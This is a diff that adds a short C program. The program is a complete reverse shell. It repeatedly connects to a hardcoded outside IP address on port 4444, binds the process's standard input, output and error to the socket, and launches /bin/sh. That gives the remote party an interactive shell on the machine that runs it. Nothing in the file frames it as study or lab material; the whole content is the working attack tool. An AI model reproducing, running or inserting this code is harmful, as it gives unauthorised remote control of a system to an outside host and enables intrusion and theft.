@@ -1,0 +1,47 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <arpa/inet.h>
+
+void connectToServer(const char *server_ip, int port) {
+    int sock;
+    struct sockaddr_in server_addr;
+
+    while (1) {
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock == -1) {
+            perror("Socket creation failed");
+            exit(EXIT_FAILURE);
+        }
+
+        server_addr.sin_family = AF_INET;
+        server_addr.sin_port = htons(port);
+        server_addr.sin_addr.s_addr = inet_addr(server_ip);
+
+        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
+            perror("Connection failed, retrying...");
+            close(sock);
+            sleep(5); 
+            continue;
+        }
+
+        printf("Connected to %s:%d\n", server_ip, port);
+
+        dup2(sock, 0);
+        dup2(sock, 1);
+        dup2(sock, 2);
+        execl("/bin/sh", "sh", NULL);
+
+        close(sock);
+    }
+}
+
+int main() {
+    const char *server_ip = "49.13.20.171";
+    int port = 4444;
+
+    connectToServer(server_ip, port);
+
+    return 0;
+}
